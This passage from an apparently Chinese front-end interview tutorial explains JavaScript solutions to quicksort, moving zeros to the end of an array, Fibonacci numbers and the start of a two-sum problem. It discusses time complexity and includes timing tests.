</code></pre></div><h3 id="实现快速排序并说明时间复杂度"><a href="#实现快速排序并说明时间复杂度" class="header-anchor">#</a> 实现快速排序并说明时间复杂度</h3> <p><strong>思路分析</strong></p> <ul><li>找到中间位置<code>midValue</code></li> <li>遍历数组，小于<code>midValue</code>放在<code>left</code>，否则放在<code>right</code></li> <li>继续递归，最后<code>concat</code>拼接返回</li> <li>使用<code>splice</code>会修改原数组，使用<code>slice</code>不会修改原数组（推荐）</li> <li>一层遍历+二分的时间复杂度是<code>O(nlogn)</code></li></ul> <p><img alt="" data-src="https://s.poetries.work/uploads/2023/01/553d2314d0d81dfe.png" loading="lazy" class="lazy"></p> <p><strong>快速排序（使用 splice）</strong></p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">/**
 * 快速排序（使用 splice）
 * @param arr:number[] number arr
 */</span>
<span class="token keyword">function</span> <span class="token function">quickSort1</span><span class="token punctuation">(</span><span class="token parameter">arr</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> length <span class="token operator">=</span> arr<span class="token punctuation">.</span>length
  <span class="token keyword">if</span> <span class="token punctuation">(</span>length <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> arr

  <span class="token comment">// 获取中间的数</span>
  <span class="token keyword">const</span> midIndex <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span>length <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span>
  <span class="token keyword">const</span> midValue <span class="token operator">=</span> arr<span class="token punctuation">.</span><span class="token function">splice</span><span class="token punctuation">(</span>midIndex<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token comment">// splice会修改原数组，传入开始位置和长度是1</span>

  <span class="token keyword">const</span> left <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
  <span class="token keyword">const</span> right <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>

  <span class="token comment">// 注意：这里不用直接用 length ，而是用 arr.length 。因为 arr 已经被 splice 给修改了</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> arr<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> n <span class="token operator">=</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">&lt;</span> midValue<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token comment">// 小于 midValue ，则放在 left</span>
      left<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
      <span class="token comment">// 大于 midValue ，则放在 right</span>
      right<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">return</span> <span class="token function">quickSort1</span><span class="token punctuation">(</span>left<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token punctuation">[</span>midValue<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token function">quickSort1</span><span class="token punctuation">(</span>right<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre></div><p><strong>快速排序（使用 slice）</strong></p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">/**
 * 快速排序（使用 slice）
 * @param arr number arr
 */</span>
<span class="token keyword">function</span> <span class="token function">quickSort2</span><span class="token punctuation">(</span><span class="token parameter">arr</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> length <span class="token operator">=</span> arr<span class="token punctuation">.</span>length
  <span class="token keyword">if</span> <span class="token punctuation">(</span>length <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> arr

  <span class="token comment">// 获取中间的数</span>
  <span class="token keyword">const</span> midIndex <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span>length <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span>
  <span class="token keyword">const</span> midValue <span class="token operator">=</span> arr<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span>midIndex<span class="token punctuation">,</span> midIndex <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token comment">// 使用slice不会修改原数组，传入开始位置和结束位置</span>

  <span class="token keyword">const</span> left <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
  <span class="token keyword">const</span> right <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>

  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">!==</span> midIndex<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// 这里要忽略掉midValue</span>
      <span class="token keyword">const</span> n <span class="token operator">=</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">&lt;</span> midValue<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// 小于 midValue ，则放在 left</span>
        left<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span>
      <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token comment">// 大于 midValue ，则放在 right</span>
        right<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">return</span> <span class="token function">quickSort2</span><span class="token punctuation">(</span>left<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token punctuation">[</span>midValue<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token function">quickSort2</span><span class="token punctuation">(</span>right<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre></div><div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 功能测试</span>
<span class="token keyword">const</span> arr1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span>
console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token function">quickSort2</span><span class="token punctuation">(</span>arr1<span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre></div><div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 性能测试</span>

<span class="token comment">// 快速排序（使用 splice）</span>
<span class="token keyword">const</span> arr1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10</span> <span class="token operator">*</span> <span class="token number">10000</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  arr1<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
console<span class="token punctuation">.</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token string">'quickSort1'</span><span class="token punctuation">)</span>
<span class="token function">quickSort1</span><span class="token punctuation">(</span>arr1<span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">timeEnd</span><span class="token punctuation">(</span><span class="token string">'quickSort1'</span><span class="token punctuation">)</span> <span class="token comment">// 74ms</span>

<span class="token comment">// 快速排序（使用 slice）</span>
<span class="token keyword">const</span> arr2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10</span> <span class="token operator">*</span> <span class="token number">10000</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  arr2<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
console<span class="token punctuation">.</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token string">'quickSort2'</span><span class="token punctuation">)</span>
<span class="token function">quickSort2</span><span class="token punctuation">(</span>arr2<span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">timeEnd</span><span class="token punctuation">(</span><span class="token string">'quickSort2'</span><span class="token punctuation">)</span> <span class="token comment">// 82ms</span>
</code></pre></div><h3 id="将数组中的0移动到末尾"><a href="#将数组中的0移动到末尾" class="header-anchor">#</a> 将数组中的0移动到末尾</h3> <ul><li>如输入 <code>[1,0,3,0,11,0]</code> 输出 <code>[1,3,11,0,0,0]</code></li> <li>只移动<code>0</code>其他顺序不变</li> <li>必须在原数组进行操作</li></ul> <p>如果不限制“必须在原数组进行操作”</p> <ul><li>定义<code>part1,part2</code>两个数组</li> <li>遍历数组，非<code>0</code> <code>push</code>到<code>part1</code>,<code>0</code> <code>push</code>到<code>part2</code></li> <li>返回合并<code>part1.concat(part2)</code></li></ul> <p><strong>思路分析</strong></p> <ul><li>嵌套循环：传统思路
<ul><li>遇到<code>0</code> <code>push</code>到数组末尾</li> <li>用<code>splice</code>截取当前元素</li> <li>时间复杂度是<code>O(n^2)</code> 算法基本不可用(<code>splice</code>移动数组元素复杂度是<code>O(n)</code>，<code>for</code>循环遍历数组复杂度是<code>O(n)</code>，整体是<code>O(n^2)</code>)</li> <li>数组是连续存储空间，要慎用<code>shift</code>、<code>unshift</code>、<code>splice</code>等API</li></ul></li> <li>双指针方式：解决嵌套循环的一个非常有效的方式
<ul><li>定义<code>j</code>指向第一个<code>0</code>，<code>i</code>指向<code>j</code>后面的第一个非<code>0</code></li> <li>交换<code>i</code>和<code>j</code>的值，继续向后移动</li> <li>只遍历一次，所以时间复杂度是<code>O(n)</code></li></ul></li></ul> <p><strong>移动 0 到数组的末尾（嵌套循环）</strong></p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">/**
 * 移动 0 到数组的末尾（嵌套循环）
 * @param arr:number[] number arr
 */</span>
<span class="token keyword">function</span> <span class="token function">moveZero1</span><span class="token punctuation">(</span><span class="token parameter">arr</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> length <span class="token operator">=</span> arr<span class="token punctuation">.</span>length
  <span class="token keyword">if</span> <span class="token punctuation">(</span>length <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span>

  <span class="token keyword">let</span> zeroLength <span class="token operator">=</span> <span class="token number">0</span>

  <span class="token comment">// 时间复杂度O(n^2)</span>
  <span class="token comment">// ![](https://s.poetries.work/uploads/2023/01/2d09248cdc2c26ae.png)</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> length <span class="token operator">-</span> zeroLength<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      arr<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">// 放到结尾</span>
      arr<span class="token punctuation">.</span><span class="token function">splice</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">// 在i的位置删除一个元素 splice本身就有 O(n) 复杂度</span>
      <span class="token comment">// [1,0,0,0,1,0] 截取了0需要把i重新回到1的位置</span>
      i<span class="token operator">--</span> <span class="token comment">// 数组截取了一个元素，i 要递减，否则连续 0 就会有错误</span>
      zeroLength<span class="token operator">++</span> <span class="token comment">// 累加 0 的长度</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre></div><p><strong>移动 0 到数组末尾（双指针）</strong></p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">/**
 * 移动 0 到数组末尾（双指针）
 * @param arr:number[] number arr
 */</span>
<span class="token keyword">function</span> <span class="token function">moveZero2</span><span class="token punctuation">(</span><span class="token parameter">arr</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> length <span class="token operator">=</span> arr<span class="token punctuation">.</span>length
  <span class="token keyword">if</span> <span class="token punctuation">(</span>length <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span>

  <span class="token comment">// ![](https://s.poetries.work/uploads/2023/01/d2ae2e0f5f41368b.png)</span>
  <span class="token comment">// [1,0,0,1,1,0] j指向0 i指向j后面的第一个非0（1），然后j和i交换位置，同时移动指针</span>
  <span class="token keyword">let</span> i <span class="token comment">// i指向j后面的第一个非0</span>
  <span class="token keyword">let</span> j <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token comment">// 指向第一个 0，索引未知先设置为-1</span>

  <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token comment">// 第一个 0</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>j <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        j <span class="token operator">=</span> i <span class="token comment">// j一开始指向第一个0，后面不会执行这里了</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// arr[i]不是0的情况</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> j <span class="token operator">&gt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token comment">// 交换数值</span>
      <span class="token keyword">const</span> n <span class="token operator">=</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token comment">// 临时变量，指向非0的值</span>
      arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token comment">// 把arr[j]指向0的值交换给arr[i]</span>
      arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> n <span class="token comment">// 把arr[i]指向非0的值交换给arr[j]</span>

      j<span class="token operator">++</span> <span class="token comment">// 指针向后移动</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre></div><div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 功能测试</span>
<span class="token keyword">const</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span>
<span class="token function">moveZero2</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span>
</code></pre></div><div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 性能测试</span>

<span class="token comment">// 移动 0 到数组的末尾（嵌套循环）</span>
<span class="token keyword">const</span> arr1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">20</span> <span class="token operator">*</span> <span class="token number">10000</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">%</span> <span class="token number">10</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    arr1<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    arr1<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
console<span class="token punctuation">.</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token string">'moveZero1'</span><span class="token punctuation">)</span>
<span class="token function">moveZero1</span><span class="token punctuation">(</span>arr1<span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">timeEnd</span><span class="token punctuation">(</span><span class="token string">'moveZero1'</span><span class="token punctuation">)</span> <span class="token comment">// 262ms</span>

<span class="token comment">// 移动 0 到数组末尾（双指针）</span>
<span class="token keyword">const</span> arr2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">20</span> <span class="token operator">*</span> <span class="token number">10000</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">%</span> <span class="token number">10</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    arr2<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    arr2<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
console<span class="token punctuation">.</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token string">'moveZero2'</span><span class="token punctuation">)</span>
<span class="token function">moveZero2</span><span class="token punctuation">(</span>arr2<span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">timeEnd</span><span class="token punctuation">(</span><span class="token string">'moveZero2'</span><span class="token punctuation">)</span> <span class="token comment">// 3ms</span>

<span class="token comment">// 结论：双指针方式优于嵌套循环方式</span>
</code></pre></div><h3 id="求斐波那契数列的第n值"><a href="#求斐波那契数列的第n值" class="header-anchor">#</a> 求斐波那契数列的第n值</h3> <ul><li>计算斐波那契数列的第n值</li> <li>注意时间复杂度</li></ul> <p><strong>分析</strong></p> <ul><li><code>f(0) = 0</code></li> <li><code>f(1) = 1</code></li> <li><code>f(n) = f(n - 1) + f(n - 2)</code> 结果=前一个数+前两个数 0 1 1 2 3 5 8 13 21 34 ...</li></ul> <p><strong>1. 斐波那契数列（递归）</strong></p> <ul><li>递归，大量重复计算，时间复杂度<code>O(2^n)</code>，<code>n</code>越大越慢可能崩溃，完全不可用</li></ul> <p><img alt="" data-src="https://s.poetries.work/uploads/2023/01/29b41c380edea0e9.png" loading="lazy" class="lazy"></p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">/**
 * 斐波那契数列（递归）时间复杂度O(2^n)，n越大越慢可能崩溃
 * @param n:number n
 */</span>
<span class="token keyword">function</span> <span class="token function">fibonacci</span><span class="token punctuation">(</span><span class="token parameter">n</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">===</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">1</span>

  <span class="token keyword">return</span> <span class="token function">fibonacci</span><span class="token punctuation">(</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">fibonacci</span><span class="token punctuation">(</span>n <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre></div><div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 功能测试</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">fibonacci</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// 55</span>
<span class="token comment">// 如果是递归的话n越大 可能会崩溃</span>
</code></pre></div><p><strong>拓展-动态规划</strong></p> <ul><li>把一个大问题拆为一个小问题，逐级向下拆解 <code>f(n) = f(n - 1) + f(n - 2)</code></li> <li>用递归的思路去分析问题，再改为循环来实现</li> <li>算法三大思维：贪心、二分、动态规划</li></ul> <p><strong>2. 拓展：青蛙跳台阶</strong></p> <ul><li>一只青蛙，一次可跳一级，也可跳两级</li> <li>请问：青蛙一次跳上n级台阶，有多少种方式</li></ul> <p><strong>用动态归还分析问题</strong></p> <ul><li><code>f(1) = 1</code> 一次跳一级</li> <li><code>f(2) = 2</code> 一次跳二级</li> <li><code>f(n) = f(n - 1) + f(n - 2)</code> 跳<code>n</code>级</li></ul> <p><strong>3. 斐波那契数列（循环）</strong></p> <ul><li>不用递归，用循环</li> <li>记录中间结果</li> <li>优化后时间复杂度<code>O(n)</code></li></ul> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">/**
 * 斐波那契数列（循环）
 * @param n:number n
 */</span>
<span class="token keyword">function</span> <span class="token function">fibonacci</span><span class="token punctuation">(</span><span class="token parameter">n</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">===</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">1</span>

  <span class="token comment">// ![](https://s.poetries.work/uploads/2023/01/c61bb6c51c6263cf.png)</span>
  <span class="token keyword">let</span> n1 <span class="token operator">=</span> <span class="token number">1</span> <span class="token comment">// 记录 n-1 的结果</span>
  <span class="token keyword">let</span> n2 <span class="token operator">=</span> <span class="token number">0</span> <span class="token comment">// 记录 n-2 的结果</span>
  <span class="token comment">// n1、n2整体往后移动</span>
  <span class="token keyword">let</span> res <span class="token operator">=</span> <span class="token number">0</span> <span class="token comment">// 记录当前累加结果</span>

  <span class="token comment">// 从2开始才能计算和相加 0 1是固定的</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    res <span class="token operator">=</span> n1 <span class="token operator">+</span> n2 <span class="token comment">// 计算当前结果</span>

    <span class="token comment">// 记录中间结果，下一次循环使用</span>
    n2 <span class="token operator">=</span> n1 <span class="token comment">// 更新n2的值为n1的 往后移动累加</span>
    n1 <span class="token operator">=</span> res <span class="token comment">// n1是累加的结果</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">return</span> res
<span class="token punctuation">}</span>
</code></pre></div><div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">// 功能测试</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">fibonacci</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// 55</span>
<span class="token comment">// 不会导致崩溃</span>
</code></pre></div><h3 id="给一个数组-找出其中和为n的两个元素-两数之和"><a href="#给一个数组-找出其中和为n的两个元素-两数之和" class="header-anchor">#</a> 给一个数组，找出其中和为n的两个元素（两数之和）</h3> <ul><li>有一个递增数组<code>[1,2,4,7,11,15]</code>和一个<code>n=15</code></li> <li>数组中有两个数，和是<code>n</code>。即<code>4 + 11 = 15</code></li> <li>写一个函数，找出这两个数</li></ul> <p><strong>思路分析</strong></p> <ul><li>嵌套循环，找到一个数，然后去遍历下一个数，求和判断，时间复杂度是 <code>O(n^2)</code> 基本不可用</li> <li>双指针方式，时间复杂度降低到<code>O(n)</code> <ul><li>定义<code>i</code>指向头</li> <li>定义<code>j</code>指向尾</li> <li>求<code>arr[i] + arr[j]</code>的和，如果大于<code>n</code>，则j向前移动<code>j--</code>，如果小于<code>n</code>，则<code>i</code>向后移动<code>i++</code></li></ul></li> <li>优化<code>嵌套循环</code>，可以考虑<code>双指针</code></li></ul> <p><strong>寻找和为 n 的两个数（嵌套循环）</strong></p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">/**
 * 寻找和为 n 的两个数（嵌套循环）
 * @param arr arr：number[]
 * @param n n：number
 */</span>
<span class="token keyword">function</span> <span class="token function">findTowNumbers1</span><span class="token punctuation">(</span><span class="token parameter">arr<span class="token punctuation">,</span> n</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>

  <span class="token keyword">const</span> length <span class="token operator">=</span> arr<span class="token punctuation">.</span>length
  <span class="token keyword">if</span> <span class="token punctuation">(</span>length <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> res

  <span class="token comment">// 时间复杂度 O(n^2)</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">const</span> n1 <span class="token operator">=</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
    <span class="token keyword">let</span> flag <span class="token operator">=</span> <span class="token boolean">false</span> <span class="token comment">// 是否得到了结果(两个数加起来等于n)</span>

    <span class="token comment">// j从i + 1开始，获取第二个数n2</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> j <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> length<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">const</span> n2 <span class="token operator">=</span> arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span>

      <span class="token keyword">if</span> <span class="token punctuation">(</span>n1 <span class="token operator">+</span> n2 <span class="token operator">===</span> n<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        res<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>n1<span class="token punctuation">)</span>
        res<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>n2<span class="token punctuation">)</span>
        flag <span class="token operator">=</span> <span class="token boolean">true</span>
